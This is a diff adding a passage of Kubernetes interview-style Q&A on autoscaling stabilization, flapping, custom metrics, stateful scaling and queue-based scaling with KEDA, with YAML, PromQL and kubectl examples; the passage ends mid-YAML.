@@ -38134,3 +38134,13653 @@ Fix: identify source, configure pools properly.
 4. **Connection pool exhaustion**: 50 pods, each with 50 DB connections = 2500. DB max was 1000. Pods waited for connections. Latency awful. Reduced to 20 per pod, added PgBouncer.
 
 5. **Native image production**: Microservice with strict latency SLA. Switched to GraalVM native. Startup time: 100ms (vs. 45s JVM). Memory: 50MB (vs. 500MB). Trade-off: longer build, no JIT optimization.
+
+# Kubernetes Scaling & Performance (201-220)
+
+## 201. Explain autoscaling stabilization windows
+
+Stabilization windows prevent autoscalers from making rapid scaling decisions based on transient metric changes. Without them, you'd see constant up-and-down scaling (flapping) that causes more harm than the original load variation.
+
+**The problem they solve:**
+
+Metrics are noisy. CPU usage fluctuates second-by-second. A spike from 65% to 75% might be a real load increase, or it might be a brief GC pause, a backup process, or just normal variance. Reacting to every fluctuation creates instability.
+
+**How stabilization windows work:**
+
+HPA v2 introduced configurable stabilization for both scale-up and scale-down:
+
+```yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: myapp
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: myapp
+  minReplicas: 3
+  maxReplicas: 50
+  metrics:
+    - type: Resource
+      resource:
+        name: cpu
+        target:
+          type: Utilization
+          averageUtilization: 70
+  behavior:
+    scaleDown:
+      stabilizationWindowSeconds: 300   # 5 minutes
+      policies:
+        - type: Percent
+          value: 10
+          periodSeconds: 60
+    scaleUp:
+      stabilizationWindowSeconds: 0     # No delay
+      policies:
+        - type: Percent
+          value: 100
+          periodSeconds: 60
+        - type: Pods
+          value: 4
+          periodSeconds: 60
+        - type: Pods
+          value: 4
+          periodSeconds: 60
+      selectPolicy: Max
+```
+
+**How the window works:**
+
+HPA looks at the metric history within the window. For scale-down, it considers the **maximum** recommendation across the window. For scale-up, it considers the **minimum** recommendation across the window.
+
+This means:
+- Scale-down: if the metric was high at any point in the last 5 minutes, don't scale down
+- Scale-up: if the metric was low at any point in the last window, hesitate to scale up
+
+**Default values:**
+
+- **scaleDown.stabilizationWindowSeconds**: 300s (5 minutes)
+- **scaleUp.stabilizationWindowSeconds**: 0s (no delay)
+
+The asymmetry is intentional: scale up quickly to handle load, scale down cautiously to avoid removing capacity needed for the next spike.
+
+**Policies within behavior:**
+
+Policies define **how much** to scale per period:
+
+```yaml
+scaleDown:
+  policies:
+    - type: Pods
+      value: 4        # Remove at most 4 pods per minute
+      periodSeconds: 60
+    - type: Percent
+      value: 10       # Or 10% of current count
+      periodSeconds: 60
+  selectPolicy: Min   # Take the more conservative
+```
+
+**Real-world example:**
+
+Without stabilization:
+```
+10:00:00  CPU 80% → scale up to 10 pods
+10:00:30  CPU 50% → scale down to 6 pods
+10:01:00  CPU 80% → scale up to 10 pods
+10:01:30  CPU 50% → scale down to 6 pods
+```
+
+Constant churn. Bad for application stability.
+
+With stabilization (5 min scale-down):
+```
+10:00:00  CPU 80% → scale up to 10 pods
+10:00:30  CPU 50% → window holds; stays at 10
+10:01:00  CPU 80% → still need 10
+10:05:00  CPU consistently 50% → finally scale down
+```
+
+Stable behavior, capacity available when needed.
+
+**Tuning stabilization windows:**
+
+**For predictable workloads with smooth load:**
+- Scale-down window: 60-120s (quick to scale down)
+- Scale-up window: 0-30s
+
+**For spiky workloads:**
+- Scale-down window: 300-600s (5-10 min, keep capacity)
+- Scale-up window: 0s (react immediately)
+
+**For batch workloads:**
+- Long scale-down windows (avoid losing workers mid-batch)
+- Match window to batch duration
+
+**For latency-critical:**
+- Very long scale-down windows (always have headroom)
+- Aggressive scale-up
+
+**Common mistakes:**
+
+**Mistake 1: Zero stabilization for scale-down**
+
+```yaml
+scaleDown:
+  stabilizationWindowSeconds: 0
+```
+
+Causes rapid scale-down on metric dips. New traffic spike requires re-scaling. Cycle continues.
+
+**Mistake 2: Excessive stabilization**
+
+```yaml
+scaleDown:
+  stabilizationWindowSeconds: 3600   # 1 hour
+```
+
+Cluster never scales down. Wastes resources during off-peak.
+
+**Mistake 3: Symmetric windows**
+
+```yaml
+scaleDown:
+  stabilizationWindowSeconds: 300
+scaleUp:
+  stabilizationWindowSeconds: 300   # Same as scale-down
+```
+
+Slow to react to spikes. Latency issues during load increases.
+
+**KEDA stabilization:**
+
+KEDA uses HPA under the hood. Same stabilization rules apply:
+
+```yaml
+spec:
+  advanced:
+    horizontalPodAutoscalerConfig:
+      behavior:
+        scaleDown:
+          stabilizationWindowSeconds: 600
+```
+
+For event-driven workloads, scale-up should be fast (queue depth growing = need more workers). Scale-down can be slower (queue empty doesn't mean it'll stay empty).
+
+**Cluster Autoscaler analog:**
+
+CA has its own stabilization parameters:
+
+```yaml
+args:
+  - --scale-down-delay-after-add=10m      # Wait after scale-up
+  - --scale-down-unneeded-time=10m        # Node must be unneeded 10 min
+  - --scale-down-utilization-threshold=0.5
+```
+
+These prevent node thrashing.
+
+**Production scenarios:**
+
+1. **Default scale-down too aggressive**: Application had 30s scale-down (default). During brief metric dips, lost 30% of pods. Next spike caused latency issues. Increased to 300s. Stable.
+
+2. **Long stabilization for ML inference**: ML inference service. Models took 30s to load. Quick scale-down → cold start on next request. Set scale-down window to 900s. Steady performance.
+
+3. **Stabilization broke during incident**: Incident caused load spike. Stabilization window held existing pods (good) but also delayed scale-up beyond what we wanted. Tuned scaleUp window to 30s for faster response.
+
+4. **KEDA + stabilization for queue**: Queue depth scaling. Without stabilization, momentary empty queue scaled to 0, then immediate scale-up on next message. Cold start hurt. Set scale-down window to 600s, kept minimal replicas.
+
+5. **Different windows per service tier**: Critical services: 600s scale-down. Standard: 300s. Batch: 60s. Tuned based on cost vs. resilience tradeoffs.
+
+---
+
+## 202. How do you avoid scaling flapping?
+
+Scaling flapping (rapid up-down oscillation) is destructive: pods constantly created and destroyed, applications never reach steady state, downstream systems thrashed.
+
+**Why flapping happens:**
+
+**Cause 1: Reactive scaling on noisy metrics**
+
+CPU/memory metrics naturally fluctuate. Reacting to every change → flapping.
+
+**Cause 2: Insufficient stabilization**
+
+Default 0s scale-up, 30s scale-down (older versions). Rapid changes.
+
+**Cause 3: Wrong metric chosen**
+
+CPU might not represent actual load:
+- App is CPU-light, I/O-bound
+- CPU spike from GC, not actual work
+- New pod startup spikes CPU briefly
+
+**Cause 4: Target thresholds too tight**
+
+```yaml
+target:
+  averageUtilization: 70   # Add pod
+# When utilization drops just below 70, scale down
+```
+
+Small variations cross threshold repeatedly.
+
+**Cause 5: Cold start effects**
+
+New pod has low CPU initially → drops average → scale down → load returns → scale up.
+
+**Cause 6: HPA and VPA conflict**
+
+VPA changes requests; HPA recalculates utilization; thrashing.
+
+**Strategies to prevent flapping:**
+
+**Strategy 1: Tune stabilization windows**
+
+```yaml
+behavior:
+  scaleDown:
+    stabilizationWindowSeconds: 300   # 5 min
+  scaleUp:
+    stabilizationWindowSeconds: 0
+```
+
+Asymmetric: react quickly to spikes, slowly to dips.
+
+**Strategy 2: Use rate limits**
+
+```yaml
+behavior:
+  scaleDown:
+    policies:
+      - type: Percent
+        value: 10
+        periodSeconds: 60   # Max 10% reduction per minute
+  scaleUp:
+    policies:
+      - type: Percent
+        value: 50
+        periodSeconds: 60   # Max 50% increase per minute
+      - type: Pods
+        value: 4
+        periodSeconds: 60
+    selectPolicy: Max
+```
+
+Gradual changes prevent overshooting.
+
+**Strategy 3: Hysteresis (different up/down thresholds)**
+
+Built-in: HPA scales up at target, down at lower threshold (computed automatically). But you can adjust effective hysteresis via stabilization.
+
+**Strategy 4: Use multiple metrics**
+
+```yaml
+metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 70
+  - type: Pods
+    pods:
+      metric:
+        name: requests_per_second
+      target:
+        type: AverageValue
+        averageValue: 100
+```
+
+HPA scales to the max of all metrics' recommendations. Less likely to flap on single noisy metric.
+
+**Strategy 5: Pick the right metric**
+
+CPU isn't always right:
+- Web service: requests per second
+- Queue worker: queue depth
+- ML inference: inference rate
+- Database: query rate
+
+```yaml
+# Better for web service:
+metrics:
+  - type: Pods
+    pods:
+      metric:
+        name: http_requests_per_second
+      target:
+        type: AverageValue
+        averageValue: "100"   # 100 req/sec per pod
+```
+
+RPS-based scaling is more stable than CPU-based for web services.
+
+**Strategy 6: Smooth metrics with longer windows**
+
+```yaml
+# Custom Prometheus metric with averaging:
+query: avg_over_time(http_requests_per_second[2m])
+```
+
+2-minute average smooths brief spikes.
+
+**Strategy 7: Target utilization with buffer**
+
+Don't target 100%:
+
+```yaml
+averageUtilization: 60   # Not 90
+```
+
+Lower targets give buffer. Small fluctuations don't cross threshold.
+
+**Strategy 8: Wider min/max ranges**
+
+```yaml
+minReplicas: 5
+maxReplicas: 50
+```
+
+Vs. tight range:
+
+```yaml
+minReplicas: 3
+maxReplicas: 10
+```
+
+Tight ranges with high variance = more scaling events. Wider ranges absorb variance better.
+
+**Strategy 9: Resource requests calibration**
+
+```yaml
+# If requests are way too low:
+requests:
+  cpu: 100m
+
+# Actual usage: 2000m
+# Utilization shows 2000% → wild scaling
+```
+
+Set requests near typical usage. Utilization becomes meaningful.
+
+**Strategy 10: Pod readiness during warmup**
+
+New pod takes time to be useful (cache warming, JIT). HPA sees it as "ready" too early.
+
+```yaml
+readinessProbe:
+  httpGet:
+    path: /ready
+    port: 8080
+  initialDelaySeconds: 30   # Don't include in load distribution too soon
+  periodSeconds: 5
+```
+
+Or use a custom readiness signal that triggers only after warmup.
+
+**Strategy 11: Disable scale-down briefly**
+
+For known-spike windows:
+
+```yaml
+# Scheduled scaling via KEDA cron:
+triggers:
+  - type: cron
+    metadata:
+      start: 0 9 * * *    # 9 AM
+      end: 0 10 * * *     # 10 AM
+      desiredReplicas: "20"
+```
+
+Prevents flapping during predictable load.
+
+**Strategy 12: VPA in recommendation-only mode**
+
+Don't combine VPA-auto with HPA on same metric. Use VPA in `Off` mode (recommendations only). Apply recommendations manually or via separate workflow.
+
+**Monitoring flapping:**
+
+```promql
+# Count of scaling events:
+changes(kube_horizontalpodautoscaler_status_current_replicas[1h])
+
+# Alert if > 5 changes per hour:
+changes(kube_horizontalpodautoscaler_status_current_replicas[1h]) > 5
+```
+
+```promql
+# Replica oscillation:
+# Calculate variance over time
+stddev_over_time(
+  kube_horizontalpodautoscaler_status_current_replicas[30m]
+) > 3
+```
+
+**Diagnosing flapping:**
+
+```bash
+# HPA status:
+kubectl describe hpa my-app
+
+# Look at events:
+# - Scaling events frequency
+# - Reasons
+# - Last transition time
+
+# Metric values:
+kubectl top pods -l app=my-app
+```
+
+If HPA events show frequent scaling, investigate the metric driving it.
+
+**Production scenarios:**
+
+1. **Flapping caused 5-min outages every hour**: HPA scaled between 10 and 30 pods constantly. New pods cold-started, brief degradation. Found: 60s scale-down was too aggressive. Increased to 600s. Eliminated.
+
+2. **CPU spike from logging caused scale**: Application's log shipping every minute caused CPU spike. HPA scaled up. Spike ended → scaled down. Realized log shipping wasn't real load. Switched HPA to use RPS metric.
+
+3. **HPA + VPA conflict**: Configured VPA-auto for CPU. VPA increased CPU requests. HPA saw lower utilization → scaled down. VPA observed reduced load per pod → reduced requests. Cycle. Fix: switched VPA to recommendation mode.
+
+4. **maxReplicas too low caused thrashing**: Load was at maxReplicas frequently. Couldn't fully respond. Each fluctuation triggered scale events near max. Increased max from 20 to 50. Stable.
+
+5. **Warmup time longer than scaling**: New pods took 90s to warm up. HPA's evaluation period was 60s. New pods registered as low-CPU before warmup. Triggered scale-down. Added startupProbe and custom warmup check.
+
+---
+
+## 203. Explain custom metrics autoscaling
+
+Custom metrics autoscaling extends HPA beyond CPU/memory to application-specific signals. This is essential for workloads where CPU isn't the right scaling indicator.
+
+**Why custom metrics:**
+
+CPU/memory don't always represent actual load:
+
+- **Web servers**: requests per second is more direct
+- **Queue workers**: queue depth is the real signal
+- **API gateways**: connection count
+- **ML inference**: pending inference queue
+- **Database clients**: connection pool usage
+
+**Metric types in HPA:**
+
+**Type 1: Resource metrics**
+
+Built-in CPU/memory:
+
+```yaml
+metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 70
+```
+
+**Type 2: Pods metrics**
+
+Application-specific, exposed by each pod:
+
+```yaml
+metrics:
+  - type: Pods
+    pods:
+      metric:
+        name: http_requests_per_second
+      target:
+        type: AverageValue
+        averageValue: "100"   # 100 RPS per pod
+```
+
+HPA queries the metric across all pods, averages, compares to target.
+
+**Type 3: Object metrics**
+
+Metric from a specific object:
+
+```yaml
+metrics:
+  - type: Object
+    object:
+      describedObject:
+        apiVersion: networking.k8s.io/v1
+        kind: Ingress
+        name: my-ingress
+      metric:
+        name: requests_per_second
+      target:
+        type: Value
+        value: "1000"   # Scale based on ingress traffic
+```
+
+**Type 4: External metrics**
+
+Metric outside the cluster:
+
+```yaml
+metrics:
+  - type: External
+    external:
+      metric:
+        name: sqs_queue_length
+        selector:
+          matchLabels:
+            queue: my-queue
+      target:
+        type: AverageValue
+        averageValue: "30"   # 30 messages per pod
+```
+
+**Architecture:**
+
+```
+Application emits metric → Prometheus scrapes →
+Prometheus Adapter exposes via custom.metrics.k8s.io →
+HPA queries → Scaling decision
+```
+
+**Setting up custom metrics:**
+
+**Step 1: Application exposes metric**
+
+Application provides /metrics endpoint:
+
+```python
+from prometheus_client import Counter, generate_latest
+
+requests_total = Counter('http_requests_total', 'Total requests')
+
+@app.route('/metrics')
+def metrics():
+    return generate_latest()
+```
+
+**Step 2: Prometheus scrapes**
+
+```yaml
+# Prometheus scrape config:
+scrape_configs:
+  - job_name: 'my-app'
+    kubernetes_sd_configs:
+      - role: pod
+    relabel_configs:
+      - source_labels: [__meta_kubernetes_pod_label_app]
+        action: keep
+        regex: my-app
+```
+
+**Step 3: Prometheus Adapter exposes metrics**
+
+```yaml
+# prometheus-adapter config:
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: adapter-config
+data:
+  config.yaml: |
+    rules:
+      - seriesQuery: 'http_requests_total{namespace!="",pod!=""}'
+        resources:
+          overrides:
+            namespace: {resource: "namespace"}
+            pod: {resource: "pod"}
+        name:
+          matches: "^(.*)_total$"
+          as: "${1}_per_second"
+        metricsQuery: 'rate(<<.Series>>{<<.LabelMatchers>>}[2m])'
+```
+
+Translates Prometheus query to Kubernetes-format metric.
+
+**Step 4: Verify metric is available**
+
+```bash
+kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1" | jq
+
+# Specific metric:
+kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/*/http_requests_per_second" | jq
+```
+
+**Step 5: Create HPA**
+
+```yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: my-app
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: my-app
+  minReplicas: 2
+  maxReplicas: 50
+  metrics:
+    - type: Pods
+      pods:
+        metric:
+          name: http_requests_per_second
+        target:
+          type: AverageValue
+          averageValue: "100"
+```
+
+**Common custom metrics:**
+
+**Queue-based:**
+
+```yaml
+# External metric for SQS:
+metrics:
+  - type: External
+    external:
+      metric:
+        name: sqs_messages_visible
+      target:
+        type: Value
+        value: "100"
+```
+
+**Latency-based:**
+
+```yaml
+metrics:
+  - type: Pods
+    pods:
+      metric:
+        name: http_request_duration_p95_seconds
+      target:
+        type: AverageValue
+        averageValue: "0.5"   # Scale if P95 latency > 500ms
+```
+
+**Custom application metrics:**
+
+```yaml
+metrics:
+  - type: Pods
+    pods:
+      metric:
+        name: active_websocket_connections
+      target:
+        type: AverageValue
+        averageValue: "1000"   # 1000 connections per pod
+```
+
+**Multi-metric scaling:**
+
+```yaml
+metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 70
+  - type: Pods
+    pods:
+      metric:
+        name: http_requests_per_second
+      target:
+        type: AverageValue
+        averageValue: "100"
+  - type: External
+    external:
+      metric:
+        name: queue_depth
+      target:
+        type: AverageValue
+        averageValue: "50"
+```
+
+HPA scales to satisfy whichever metric requires the most replicas.
+
+**KEDA for advanced custom scaling:**
+
+KEDA simplifies custom metric scaling, especially for external sources:
+
+```yaml
+apiVersion: keda.sh/v1alpha1
+kind: ScaledObject
+metadata:
+  name: my-app
+spec:
+  scaleTargetRef:
+    name: my-app
+  triggers:
+    - type: prometheus
+      metadata:
+        serverAddress: http://prometheus:9090
+        query: sum(rate(http_requests_total[2m]))
+        threshold: '100'
+```
+
+Direct Prometheus query, no adapter setup needed.
+
+**KEDA has 60+ scalers:**
+
+- AWS SQS, Kinesis
+- GCP Pub/Sub
+- Azure Service Bus
+- Kafka, RabbitMQ
+- Redis, MongoDB
+- Prometheus, Datadog
+- HTTP, gRPC
+- Custom
+
+**Best practices:**
+
+**Practice 1: Choose the right metric**
+
+What's the actual bottleneck?
+
+- CPU-bound: CPU metric
+- I/O-bound: connection count or queue depth
+- Latency-bound: P95 latency or response time
+
+Wrong metric = wrong scaling.
+
+**Practice 2: Avoid noisy metrics**
+
+Smooth metrics over reasonable windows:
+
+```yaml
+# Bad: instantaneous metric:
+query: http_requests_per_second
+
+# Better: averaged over 2 minutes:
+query: avg_over_time(http_requests_per_second[2m])
+```
+
+**Practice 3: Scale on user-impact metrics**
+
+Latency directly impacts users:
+
+```yaml
+metrics:
+  - type: Pods
+    pods:
+      metric:
+        name: http_request_duration_p95
+      target:
+        type: AverageValue
+        averageValue: "0.5"   # Maintain P95 < 500ms
+```
+
+Scale to maintain SLO.
+
+**Practice 4: Per-pod metrics**
+
+The metric should represent per-pod load. HPA averages across pods.
+
+If your metric is cluster-wide (e.g., total queue depth), use `Value` not `AverageValue`:
+
+```yaml
+# Total queue depth:
+target:
+  type: Value
+  value: "1000"   # When total queue > 1000, scale up
+
+# Vs per-pod:
+target:
+  type: AverageValue
+  averageValue: "100"   # 100 messages per pod
+```
+
+**Practice 5: Test before production**
+
+Test scaling behavior in staging:
+- Generate load
+- Verify HPA scales appropriately
+- Adjust thresholds based on observed behavior
+
+**Common issues:**
+
+**Issue 1: Metric not available**
+
+```bash
+kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1" | grep my_metric
+# Empty?
+```
+
+Check:
+- Application emitting metric
+- Prometheus scraping
+- Adapter configuration
+
+**Issue 2: HPA shows "unknown" for custom metric**
+
+```bash
+kubectl describe hpa my-app
+# Conditions:
+#   ScalingActive  False  FailedGetPodsMetric
+```
+
+Adapter not exposing metric correctly. Check adapter logs.
+
+**Issue 3: Scaling too aggressive**
+
+Custom metric is very dynamic. Apply smoothing:
+
+```yaml
+# In adapter config:
+metricsQuery: 'avg_over_time(http_requests_per_second{<<.LabelMatchers>>}[5m])'
+```
+
+**Issue 4: Adapter performance**
+
+Adapter queries Prometheus on every HPA evaluation. With many HPAs and complex queries, slow.
+
+Fix: simpler queries, more adapter replicas.
+
+**Production scenarios:**
+
+1. **Web service scaled on RPS instead of CPU**: Switched HPA from CPU to requests/sec. CPU varied with GC, RPS was stable. Scaling more predictable.
+
+2. **Queue worker with KEDA**: Worker pods scaled on SQS queue depth. Scale to zero during quiet, up to 50 during bursts. 70% cost savings.
+
+3. **Latency-based scaling**: Service had SLO of P95 < 200ms. HPA scaled on this metric. Maintained SLO even under variable load.
+
+4. **Multi-metric for complete picture**: CPU, RPS, and queue depth. HPA used max. No single metric was perfect; combination was robust.
+
+5. **Custom metric for WebSocket service**: Application maintained 5000 WebSocket connections per pod. Scaled on active_connections metric. Smooth scaling regardless of CPU.
+
+---
+
+## 204. How do you scale Stateful applications?
+
+Stateful applications (databases, queues, distributed systems) scale differently from stateless services. State complicates everything: replication, failover, consistency, data movement.
+
+**Why stateful is hard:**
+
+**Challenge 1: Data has gravity**
+
+State exists on disks. Moving pods means:
+- Moving volumes (slow, sometimes impossible)
+- Replicating data (network, time)
+- Maintaining consistency
+
+**Challenge 2: Identity matters**
+
+In a database cluster, pod-0 might be the primary. Replacing it isn't just "spin up new pod" - you must promote replica, reconfigure, etc.
+
+**Challenge 3: Distributed consensus**
+
+3-node consensus systems (etcd, ZooKeeper) need majority. Can't just add nodes freely; affects quorum.
+
+**Scaling patterns:**
+
+**Pattern 1: Read replicas**
+
+Read-heavy workloads can scale reads via replicas:
+
+```yaml
+# StatefulSet for PostgreSQL:
+spec:
+  replicas: 5   # 1 primary + 4 replicas
+```
+
+Application routes:
+- Writes to primary
+- Reads to replicas (round robin or similar)
+
+Scales: read capacity
+Doesn't scale: write capacity
+
+**Pattern 2: Sharding**
+
+Partition data across nodes:
+
+```
+Shard 1: users 0-9
+Shard 2: users 10-19
+Shard 3: users 20-29
+```
+
+Each shard is independent. Add shards for more capacity.
+
+**Tools:**
+- Vitess for MySQL
+- Citus for PostgreSQL
+- MongoDB sharding
+- Redis Cluster
+- CockroachDB (built-in)
+
+**Pros:** Scales both reads and writes
+**Cons:** Complex, queries spanning shards are hard
+
+**Pattern 3: Distributed databases**
+
+Built for horizontal scaling:
+
+- **CockroachDB**: PostgreSQL-compatible, distributed
+- **YugabyteDB**: Similar, also PostgreSQL/Cassandra-like
+- **Cassandra/ScyllaDB**: Wide-column, eventually consistent
+- **DynamoDB / Bigtable**: Cloud-managed
+
+These scale by adding nodes; data automatically distributed.
+
+**Pattern 4: Caching layer**
+
+Add caching to reduce database load:
+
+```
+Client → Cache (Redis) → Database
+```
+
+Cache scales easily (more Redis replicas). Database stays smaller.
+
+Patterns:
+- Read-through cache
+- Write-through cache
+- Cache-aside
+
+**Pattern 5: CQRS (Command Query Responsibility Segregation)**
+
+Separate read and write models:
+- Writes go to primary (transactional)
+- Events replicated to read-optimized stores
+- Reads served from read stores
+
+Different stores can scale independently.
+
+**Kubernetes-specific patterns:**
+
+**StatefulSet scaling:**
+
+```yaml
+apiVersion: apps/v1
+kind: StatefulSet
+spec:
+  replicas: 5
+  serviceName: my-database
+  template:
+    spec:
+      containers:
+        - name: db
+          image: postgres:15
+          volumeMounts:
+            - name: data
+              mountPath: /var/lib/postgresql/data
+  volumeClaimTemplates:
+    - metadata:
+        name: data
+      spec:
+        accessModes: ["ReadWriteOnce"]
+        resources:
+          requests:
+            storage: 100Gi
+```
+
+Each replica gets:
+- Stable identity (db-0, db-1, ...)
+- Persistent volume
+- Predictable startup order
+
+**Scaling up:**
+
+```bash
+kubectl scale statefulset db --replicas=7
+# Creates db-5 and db-6
+# Each gets its own PV
+```
+
+But scaling isn't enough - new replicas need to join the database cluster (replication, consensus). Operator usually handles this.
+
+**Scaling down:**
+
+```bash
+kubectl scale statefulset db --replicas=3
+# Removes db-4, db-3 (reverse order)
+# PVs remain (Retain reclaim policy)
+```
+
+Application must handle:
+- Removing nodes from cluster
+- Rebalancing data
+- Updating clients
+
+**Operators for stateful apps:**
+
+Operators automate operational tasks:
+
+**PostgreSQL operators:**
+- CloudNativePG
+- Postgres-Operator (Zalando)
+- CrunchyData
+
+**MongoDB:**
+- MongoDB Community Operator
+- Percona Operator
+
+**Cassandra:**
+- K8ssandra
+- DataStax Operator
+
+**Kafka:**
+- Strimzi
+- Confluent Operator
+
+These handle:
+- Scaling (proper sequence)
+- Failover
+- Backups
+- Upgrades
+
+**Operator example (CloudNativePG):**
+
+```yaml
+apiVersion: postgresql.cnpg.io/v1
+kind: Cluster
+metadata:
+  name: prod-postgres
+spec:
+  instances: 5
+  postgresql:
+    parameters:
+      shared_buffers: 256MB
+  bootstrap:
+    initdb:
+      database: app
+  storage:
+    size: 100Gi
+    storageClass: fast-ssd
+```
+
+To scale: change `instances`, operator handles the rest.
+
+**Scaling considerations by app type:**
+
+**RDBMS (PostgreSQL, MySQL):**
+
+- Vertical scaling for write capacity (bigger primary)
+- Horizontal scaling for read capacity (replicas)
+- Sharding for very large datasets
+
+**NoSQL (Cassandra, MongoDB):**
+
+- Designed for horizontal scaling
+- Add nodes, data redistributes automatically
+- Eventual consistency considerations
+
+**Caches (Redis, Memcached):**
+
+- Redis Sentinel/Cluster for HA + scaling
+- Memcached: simpler, often round-robin across instances
+- Generally easier to scale than databases
+
+**Message queues (Kafka, RabbitMQ):**
+
+- Kafka: scale via partition count, consumer groups
+- RabbitMQ: cluster nodes, shard queues
+- NATS: built for horizontal scaling
+
+**Search (Elasticsearch):**
+
+- Shard data across nodes
+- Replicas for HA
+- Hot/warm/cold architecture for cost optimization
+
+**Considerations:**
+
+**Consideration 1: Storage**
+
+Each replica needs storage. 5 replicas × 100GB = 500GB.
+
+For databases:
+- Performance (NVMe, provisioned IOPS)
+- Replication overhead
+- Backup space
+
+**Consideration 2: Network**
+
+Replication uses network. Scaling means more replication traffic.
+
+Cross-AZ replication costs money.
+
+**Consideration 3: Consistency**
+
+Strong consistency requires synchronous replication. Latency-sensitive.
+
+Eventual consistency: faster but applications must handle.
+
+**Consideration 4: Failure modes**
+
+Adding nodes adds failure modes:
+- More disks to fail
+- More network links
+- More software bugs
+
+Properly tested operators handle this.
+
+**Auto-scaling stateful:**
+
+Stateful auto-scaling is risky. Most teams scale manually:
+
+- Predictable patterns: scheduled scaling
+- Known growth: planned scaling
+- Sudden spikes: usually mean other issues
+
+KEDA does support stateful targets, but use carefully.
+
+**Anti-patterns:**
+
+**Anti-pattern 1: Treating stateful as stateless**
+
+Trying to use HPA on a database: scaling up doesn't help (writes still bound by primary).
+
+**Anti-pattern 2: No backups before scaling**
+
+Scaling operations can fail. Without backup, data loss possible.
+
+**Anti-pattern 3: Manual operations**
+
+Operating databases manually in Kubernetes is error-prone. Use operators.
+
+**Anti-pattern 4: Mixing critical and non-critical stateful**
+
+Running prod database next to dev cache on same node. Cache failure affects DB performance.
+
+**Production scenarios:**
+
+1. **Read replica scaling for analytics**: Analytics workload querying production DB caused issues. Added 5 read replicas, routed analytics there. Production unaffected, analytics fast.
+
+2. **Sharded PostgreSQL with Citus**: Database grew beyond single-node capacity (2TB). Sharded to 16 nodes via Citus. Scales horizontally now.
+
+3. **Cassandra cluster expansion**: Cluster grew from 6 to 12 nodes for capacity. Added nodes one at a time. Data rebalanced automatically. 2-week process.
+
+4. **MongoDB sharding migration**: Single MongoDB replica set hit limits. Migrated to sharded cluster. Required application changes (shard key choice critical).
+
+5. **Redis Cluster for caching**: Standalone Redis hit memory limits. Migrated to Redis Cluster with 6 shards. Linear scaling for cache capacity.
+
+---
+
+## 205. Explain queue-based autoscaling
+
+Queue-based autoscaling adjusts worker pods based on queue depth (pending work). It's ideal for asynchronous workloads where queue length directly indicates load.
+
+**Why queue-based scaling:**
+
+For async workloads:
+- CPU/memory don't reflect real load (workers might be idle waiting)
+- Queue depth shows actual work to be done
+- Direct signal for desired capacity
+
+**Common queue systems:**
+
+- **Cloud queues**: AWS SQS, GCP Pub/Sub, Azure Service Bus
+- **Self-hosted**: RabbitMQ, Kafka, NATS, Redis Streams
+- **Specialized**: Celery (Python), Sidekiq (Ruby), Bull (Node.js)
+
+**Architecture:**
+
+```
+Producer → Queue → Worker pods (auto-scaled)
+                       ↑
+                    KEDA / HPA monitors queue
+```
+
+**KEDA configuration:**
+
+KEDA is the standard tool for queue-based scaling. Examples for various queues:
+
+**AWS SQS:**
+
+```yaml
+apiVersion: keda.sh/v1alpha1
+kind: ScaledObject
+metadata:
+  name: sqs-scaler
+spec:
+  scaleTargetRef:
+    name: sqs-worker
+  minReplicaCount: 0
+  maxReplicaCount: 50
+  triggers:
+    - type: aws-sqs-queue
+      metadata:
+        queueURL: https://sqs.us-east-1.amazonaws.com/123/my-queue
+        queueLength: '10'      # Target 10 msgs per pod
+        awsRegion: us-east-1
+        activationQueueLength: '1'   # Activate from 0 at 1 msg
+      authenticationRef:
+        name: aws-credentials
+```
+
+**Kafka:**
+
+```yaml
+triggers:
+  - type: kafka
+    metadata:
+      bootstrapServers: kafka:9092
+      consumerGroup: my-consumer-group
+      topic: events
+      lagThreshold: '100'
+      offsetResetPolicy: latest
+```
+
+Scales based on consumer lag (unprocessed messages).
+
+**RabbitMQ:**
+
+```yaml
+triggers:
+  - type: rabbitmq
+    metadata:
+      protocol: amqp
+      queueName: my-queue
+      mode: QueueLength
+      value: '10'
+    authenticationRef:
+      name: rabbitmq-auth
+```
+
+**Redis Streams:**
+
+```yaml
+triggers:
+  - type: redis-streams
+    metadata:
+      address: redis:6379
+      stream: events
+      consumerGroup: my-group
+      pendingEntriesCount: '100'
+```
+
+**Calculating target replicas:**
+
+KEDA's formula:
+
+```
+desired_replicas = ceil(queue_length / target_per_pod)
+```
+
+If queue has 200 messages and target is 10 per pod:
+- 200 / 10 = 20 pods
+
+This is straightforward and predictable.
+
+**Activation vs. scaling:**
+
+Two thresholds:
+
+**Activation:**
+- Replicas: 0 → 1
+- Threshold: `activationQueueLength`
+
+**Scaling:**
+- Replicas: 1 → N
+- Threshold: `queueLength`
+
+```yaml
+triggers:
+  - type: aws-sqs-queue
+    metadata:
+      queueLength: '10'           # Each pod handles 10 messages
+      activationQueueLength: '1'  # Activate at 1 message
+```
+
+If queue empty for some time, scale to 0. First message activates 1 pod. More messages scale up further.
+
+**Scaling considerations:**
+
+**Consideration 1: Cold start**
+
+Scaling from 0 to 1 has latency:
+- KEDA detects metric: ~30s
+- Pod creation: 5-30s
+- Container start: 1-60s
+
+Total: 1-2 minutes. Acceptable for batch, problematic for real-time.
+
+**Consideration 2: Maximum partitions (Kafka)**
+
+For Kafka, max useful consumers = number of partitions:
+
+```
+Topic with 50 partitions:
+- maxReplicaCount should be ≤ 50
+- More consumers = idle (waste)
+```
+
+**Consideration 3: Downstream rate limits**
+
+Scaling consumers up can overwhelm downstream:
+- Database connection limits
+- External API rate limits
+- Network bandwidth
+
+Gradual scale-up:
+
+```yaml
+advanced:
+  horizontalPodAutoscalerConfig:
+    behavior:
+      scaleUp:
+        policies:
+          - type: Pods
+            value: 5
